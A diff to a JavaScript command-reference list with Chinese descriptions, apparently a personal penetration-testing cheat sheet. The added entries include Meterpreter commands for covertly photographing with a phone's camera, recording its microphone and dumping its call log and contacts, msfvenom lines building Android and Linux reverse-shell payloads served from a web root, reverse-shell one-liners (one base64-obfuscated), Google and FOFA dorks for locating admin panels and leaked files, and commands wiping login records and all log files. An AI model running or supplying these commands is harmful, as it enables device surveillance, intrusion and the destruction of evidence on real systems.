@@ -31,10 +31,23 @@
       { command: 'https://www.yuque.com/again-719bb/pfhi8f/gbe4ms53sp3m1mpt', description: '“小T的文章学习'},
       { command: 'https://cybermap.kaspersky.com/cn', description: '“卡巴斯基实时网络威胁地图'},      
       { command: 'https://ssa.yundun.com/cc', description: '“云盾实时网络威胁地图'},
+      { command: 'https://whatismyipaddress.com/', description: '“IP查询'},
+      
       //条形码生成网站
       { command: 'https://www.kw360.net/barcode/', description: '“条形码生成网站'},
-      
+      //资产检索
+      { command: 'https://fofa.info/', description: 'FOFA搜索引擎-资产检索'},
+      { command: 'https://www.statscrop.com/www/baidu.com', description: 'statscrop在线网站资源检测，信息收集-资产检索'},
+      { command: 'https://www.zoomeye.org/', description: '网络资产搜索网站,钟馗之眼-资产检索'},
+      { command: 'https://quake.360.net/quake/#/index', description: '360需要登录-资产检索'},
+      { command: 'https://www.shodan.io/', description: '国外的shodan-资产检索'},
 
+      //meterpreter中使用execute命令来执行目标主机上的文件
+      //ps | grep explorer
+      //migrate 3296
+
+
+      
       //metasploit下的命令
       { command: 'msfdb reinit', description: '“重置数据库-metasploit'},
       { command: 'msfdb run', description: '“启动metasploit-metasploit'},
@@ -218,13 +231,33 @@
       { command: 'systemctl restart networking', description: 'kali凯丽IP修改后重启网卡' },
       { command: 'systemctl start NetworkManager', description: 'kali凯丽IP修改后启动网络管理服务' },
       //日常命令
+
+      //安卓后渗透命令
+      { command: 'getuid', description: '显示当前Meterpreter会话所使用的用户标识符，确认是否以管理员权限运行。-安卓后渗透命令' },
+      { command: 'webcam_snap -i 2', description: '使用前置摄像头拍照-安卓后渗透命令' },
+      { command: 'record_mic -d 5', description: '录制5秒声音-安卓后渗透命令' },
+      { command: 'webcam_snap', description: '抓拍连接到目标设备的摄像头照片-安卓后渗透命令' },
+      { command: 'webcam_snap -i 2', description: '使用前置摄像头抓拍连接到目标设备的摄像头照片-安卓后渗透命令' },
+      { command: 'dump_calllog', description: '导出电话拨打通话记录-安卓后渗透命令' },
+      { command: 'sysinfo', description: '显示目标设备详细信息-安卓后渗透命令' },
+      { command: 'ps', description: '列出目标设备上当前运行的所有进程-安卓后渗透命令' },
+      { command: 'download moto_info /root', description: '下载安卓机器的内容到本地机器-安卓后渗透命令' },
+      { command: 'rm ./uploaded_file.exe', description: '删除对应的文件-安卓后渗透命令' },
+      { command: 'upload /root/1.txt ./1.txt', description: '上传本地文件到目标机器-安卓后渗透命令' },
+      { command: ' localtime', description: '显示目标系统的本地日期和时间-安卓后渗透命令' },
+      { command: ' execute -f ./app_p_a -s', description: '执行一个命令-安卓后渗透命令' },
+      { command: 'upload /root/1.txt ./1.txt', description: '上传本地文件到目标机器-安卓后渗透命令' },
+      { command: 'dump_contacts ', description: '下载联系人信息-安卓后渗透命令' },
+    
+
+      //其他命令
       { command: 'echo "net.ipv6.conf.eth0.disable_ipv6 = 1" >> /etc/sysctl.conf || sysctl -p', description: '禁用IPv6' },
       { command: '[ "$(id -u)" -eq 0 ] || { echo "You must be root to run the script"; exit 1; }', description: '检查是否是root用户' },   
-      
       //kali修改代理配置
       { command: 'vim /etc/proxychains4.conf', description: 'kali凯丽修改代理配置' },
       { command: 'socket 192.168.1.210 10808', description: 'kali凯丽修改代理配置' },
       { command: 'proxychains apt update', description: 'kali凯丽修改代理配置' },
+
       //docker简单使用
       { command: 'docker save -o vulhub_thinkphp5023.tar vulhub/thinkphp', description: '将一个镜像导出保存成一个tar包-docker的使用' },    
       { command: 'docker load -i vulhub_thinkphp5023.tar', description: '将一个镜像导出保存成一个tar包-docker的使用' },    
@@ -233,6 +266,94 @@
       { command: 'docker start 6de3079ffa12', description: 'docker删除一个容器-docker的使用' },   
       { command: 'docker ps -a', description: '查看所有的容器-docker的使用' },   
       
+      //fofa语法
+      { command: 'ip="1.1.1.1" ', description: '通过ip查询-fofa语法'},
+      { command: 'ip="220.181.111.1/24" ', description: '通过IPv4C段进行查询-fofa语法'},
+      { command: 'ip="2600:9000:202a:2600:18:4ab7:f600:93a1" ', description: '通过单一Ipv6地址进行查询-fofa语法'},
+      { command: 'port="6379" ', description: '通过端口号进行查询-fofa语法'},
+      { command: 'host=".fofa.info" ', description: '通过主机名进行查询-fofa语法'},
+      { command: 'os="centos" ', description: '通过操作系统进行查询-fofa语法'},
+      { command: 'server="Microsoft-IIS/10" ', description: '通过服务器进行查询-fofa语法'},
+      { command: 'is_domain=true ', description: '筛选拥有域名的资产-fofa语法'},
+      { command: 'is_ipv6=true ', description: '筛选是ipv6的资产-fofa语法'},
+      { command: 'title="beijing" ', description: '通过网站标题进行查询-fofa语法'},
+      { command: 'header="elastic" ', description: '通过响应标头进行查询-fofa语法'},
+      { command: 'header_hash="1258854265" ', description: '通过http/https响应头计算的hash值进行查询-fofa语法'},
+      { command: 'body="网络空间测绘" ', description: '通过HTML正文进行查询-fofa语法'},
+      { command: 'body_hash="-2090962452" ', description: '通过HTML正文计算的hash值进行查询-fofa语法'},
+      { command: 'js_name="js/jquery.js" ', description: '通过HTML正文包含的JS进行查询-fofa语法'},
+      { command: 'js_md5="82ac3f14327a8b7ba49baa208d4eaa15" ', description: '通过JS源码进行查询-fofa语法'},
+      { command: 'cname="ap21.inst.siteforce.com" ', description: '通过别名记录进行查询-fofa语法'},
+      { command: 'cname_domain="siteforce.com" ', description: '通过别名记录解析的主域名进行查询-fofa语法'},
+      { command: 'icon_hash="-247388890" ', description: '通过网站图标的hash值进行查询-fofa语法'},
+      { command: 'status_code="402" ', description: '筛选服务状态为402的服务（网站）资产-fofa语法'},
+      { command: 'icp="京ICP证030173号" ', description: '通过HTML正文包含的ICP备案号进行查询-fofa语法'},
+      { command: 'sdk_hash=="Mkb4Ms4R96glv/T6TRzwPWh3UDatBqeF" ', description: '通过网站嵌入的第三方代码计算的hash值进行查询-fofa语法'},
+      { command: 'country="CN" ', description: '通过国家的简称代码进行查询-fofa语法'},
+      { command: 'region="Zhejiang" ', description: '通过省份/地区英文名称进行查询-fofa语法'},
+      { command: 'city="Hangzhou" ', description: '通过城市英文名称进行查询-fofa语法'},
+      { command: 'cert="baidu" ', description: '通过证书进行查询-fofa语法'},
+      { command: 'cert.subject="OracleCorporation" ', description: '通过证书的持有者进行查询-fofa语法'},
+      { command: 'cert.issuer="DigiCert" ', description: '通过证书的颁发者进行查询-fofa语法'},
+      { command: 'cert.subject.org="OracleCorporation" ', description: '通过证书持有者的组织进行查询-fofa语法'},
+      { command: 'cert.subject.cn="baidu.com" ', description: '通过证书持有者的通用名称进行查询-fofa语法'},
+      { command: 'cert.issuer.org="cPanel,Inc." ', description: '通过证书颁发者的组织进行查询-fofa语法'},
+      { command: 'cert.issuer.cn="SynologyInc.CA" ', description: '通过证书颁发者的通用名称进行查询-fofa语法'},
+      { command: 'cert.is_valid=true ', description: '筛选证书是有效证书的资产-fofa语法'},
+      { command: 'after="2023-01-01" ', description: '筛选某一时间之后有更新的资产-fofa语法'},
+      { command: 'before="2023-12-01" ', description: '筛选某一时间之前有更新的资产-fofa语法'},
+      { command: 'after="2023-01-01"&&before="2023-12-01" ', description: '筛选某一时间区间有更新的资产-fofa语法'},
+      { command: 'port_size="6" ', description: '筛选开放端口数量等于6个的独立IP-fofa语法'},
+      { command: 'port_size_gt="6" ', description: '筛选开放端口数量大于6个的独立IP-fofa语法'},
+      { command: 'port_size_lt="12" ', description: '筛选开放端口数量小于12个的独立IP-fofa语法'},
+      { command: 'ip_ports="80,161" ', description: '筛选同时开放不同端口的独立IP-fofa语法'},
+      { command: 'ip_country="CN" ', description: '通过国家的简称代码进行查询独立IP-fofa语法'},
+      { command: 'ip_region="Zhejiang" ', description: '通过省份/地区英文名称进行查询独立IP-fofa语法'},
+      { command: 'ip_city="Hangzhou" ', description: '通过城市英文名称进行查询独立IP-fofa语法'},
+      { command: 'ip_after="2021-03-18" ', description: '筛选某一时间之后有更新的独立IP-fofa语法'},
+      { command: 'ip_before="2019-09-09" ', description: '筛选某一时间之前有更新的独立IP-fofa语法'},
+      { command: 'title=="ChatGPT Web" ', description: '搜索chatGPT网站使用-fofa语法'},
+      { command: 'header="thinkphp" && country="CN" ', description: '搜索HTTP响应头中含有"thinkphp"关键词的网站和IP-fofa语法'},
+      { command: 'header="thinkphp" && country="CN" && title="后台管理" ', description: '加上标题带有后台的-fofa语法'},
+      { command: 'header="thinkphp" && country="CN" && title="后台管理" && after="2023-01-12" ', description: '加上时间，现在新网站有thinkphp日志泄露的有很多-fofa语法'},
+      { command: 'body="管理后台" ', description: '搜索html正文中含有"管理后台"关键词的网站和IP-fofa语法'},
+      { command: 'domain=" buaa.edu.cn" ', description: '搜索根域名中带有"buaa.edu.cn"的网站-fofa语法'},
+      { command: 'host="edu" ', description: '搜索域名中带有"edu"关键词的网站-fofa语法'},
+      { command: 'ip="120.27.6.1/24" ', description: '搜索指定IP或IP段-fofa语法'},
+      { command: 'ip="120.97.56.1" ', description: '搜索指定IP或IP段-fofa语法'},
+      { command: 'port="3389" && country=CN ', description: '搜索开放3389端口并且位于中国的IP-fofa语法'},
+      //Google语法
+      { command: 'site:baidu.com', description: '指定域名：-google语法'},
+      { command: 'inurl:baidu.com', description: 'URL中存在的关键字页面：-google语法'},
+      { command: 'intext:baidu.com', description: '网页内容里面的关键字：-google语法'},
+      { command: 'Filetype: xlsx', description: '指定文件类型：-google语法'},
+      { command: 'intitle: 物流', description: '网页标题中的关键字：-google语法'},
+      { command: 'link:baidu.com', description: '返回你所有的指定域名链接：-google语法'},
+      { command: 'info:www.google.com', description: '查找指定站点信息：-google语法'},
+      { command: 'cache:baidu.com', description: '搜索Google里的内容缓存：-google语法'},
+      { command: 'inurl:/admin.php', description: '实战搜索登录地址：-google语法'},
+      { command: 'intitle:index.of .git', description: '实战搜索登录地址：-google语法'},
+      { command: 'site:abc.com ( "默认密码" OR "学号" OR "工号")', description: '敏感信息搜索:-google语法'},
+      { command: 'site:abc.com (inurl:login OR inurl:admin OR inurl:index OR inurl:登录) OR (inurl:config | inurl:env | inurl:setting | inurl:backup | inurl:admin | inurl:php)', description: '后台接口和敏感信息探测:-google语法'},
+      { command: 'site:abc.com filetype:txt OR filetype:xls OR filetype:xlsx OR filetype:doc OR filetype:docx OR filetype:pdf', description: '查找暴露的特殊文件:-google语法'},
+      { command: 'site:openbugbounty.org inurl:reports intext:"abc.com"', description: '已公开的XSS和重定向漏洞:-google语法'},
+      { command: 'site:abc.com ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess', description: '常见的敏感文件扩展:-google语法'},
+      { command: 'inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang= inurl:& site:abc.com', description: 'XSS漏洞倾向参数:-google语法'},
+      { command: 'inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:abc.com', description: '重定向漏洞倾向参数:-google语法'},
+      { command: 'inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:& site:abc.com', description: 'SQL注入倾向参数:-google语法'},
+      { command: 'inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain= | inurl:page= inurl:& site:abc.com', description: 'SSRF漏洞倾向参数:-google语法'},
+      { command: 'inurl:include | inurl:dir | inurl:detail= | inurl:file= | inurl:folder= | inurl:inc= | inurl:locate= | inurl:doc= | inurl:conf= inurl:& site:abc.com', description: '本地文件包含（LFI）倾向参数:-google语法'},
+      { command: 'inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | inurl:read= | inurl:ping= inurl:& site:abc.com', description: '远程命令执行（RCE）倾向参数:-google语法'},
+      { command: 'inurl:email= | inurl:phone= | inurl:password= | inurl:secret= inurl:& site:abc.com', description: '敏感参数:-google语法'},
+      { command: 'inurl:apidocs | inurl:api-docs | inurl:swagger | inurl:api-explorer site:abc.com', description: 'API文档:-google语法'},
+      { command: 'site:pastebin.com "abc.com"', description: '代码泄露:-google语法'},
+      { command: 'site:s3.amazonaws.com "abc.com"', description: '云存储:-google语法'},
+      { command: 'site:jfrog.io "abc.com"', description: 'JFrogArtifactory:-google语法'},
+      { command: 'site:firebaseio.com "abc.com"', description: 'Firebase:-google语法'},
+      { command: 'site:abc.com "choose file"', description: '文件上传端点:-google语法'},
+      { command: 'submit vulnerability report | "powered by bugcrowd" | "powered by hackerone" site:*/security.txt "bounty"', description: '漏洞赏金和漏洞披露程序:-google语法'},
+      { command: 'site:*/server-status apache', description: '暴露的Apache服务器状态:-google语法'},
+      { command: 'inurl:/wp-admin/admin-ajax.php', description: 'WordPress:-google语法'},
 
 
       //window10-1903渗透测试  
@@ -260,18 +381,26 @@
       { command: 'netstat -ano | findstr ESTABLISHED', description: '查看自己电脑与哪些IP建立了连接-window10溯源' },
       { command: 'tasklist | findstr 25748', description: '发现可疑IP，通过进程ID查询运行的是哪个程序-window10溯源' },      
       { command: 'wmic process where processid=25748 get processid,executablepath,name', description: '获取程序全路径名-window10溯源' },
+      { command: ' https://x.threatbook.com/', description: '也可以通过：微步在线X情报社区查询IP相关信息-window10溯源' },
       //linux 反弹与监听
-
       { command: 'nc -nvlp 4444', description: '服务端监听命令-linux 反弹与监听' },      
       { command: 'bash -i > /dev/tcp/192.168.1.53/4444 2>&1 0>&1', description: '未优化的反弹命令-linux 反弹与监听' },
       { command: 'bash -i >& /dev/tcp/192.168.1.53/4444 0>&1', description: '优化后的反弹命令-linux 反弹与监听' },
       { command: 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNTMvNDQ0NCAwPiYx | base64 -d | bash', description: 'base64转换后的反弹命令-linux 反弹与监听' },
-      
+      //mm生成
+      { command: 'msfvenom -p android/meterpreter_reverse_tcp lhost=192.168.1.53 lport=4444 R -o /var/www/html/an.apk', description: '安卓美美-mm生成' },
+      { command: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 -b "\0x00" -f elf -o /var/www/html/mkn-ghost', description: 'linux美美-mm生成' },
 
 
-
-
-
+      //经典名句
+      { command: '周星驰：“我以为凭我们的交情，可以讲点感情，没想到还是一笔买卖。”', description: '周星驰' },
+      //
+      { command: 'https://github.com/M00nRise/ProcessHider”', description: '黑客之隐藏程序' },
+       { command: 'echo > /var/log/btmp”', description: '删除登录失败记录' },     
+       { command: 'echo > /var/log/wtmp”', description: '删除登录成功记录' },    
+       { command: 'find / \\( -path \'/proc\' -o -type f \\) -name \'*.log\' -exec rm -f {} +', description: '删除除了PROC以外目录的所有.log文件' }, 
+       { command: 'find / \\( -path \'/proc\' -o -type f \\) -name \'*.log\' -exec sh -c \'echo 666 > "{}"\' \\;', description: '删除除了PROC以外目录的所有.log文件' }, 
+        
 
       // 其他结果..
       //{ command: 'grep "model name" /proc/cpuinfo | cut -d ' ' -f3- | awk ''{print $1,$2,$3,$4,$5,$6,$7,$8,$9,$10}' | head -1', description: '查询主机CPU配置' },
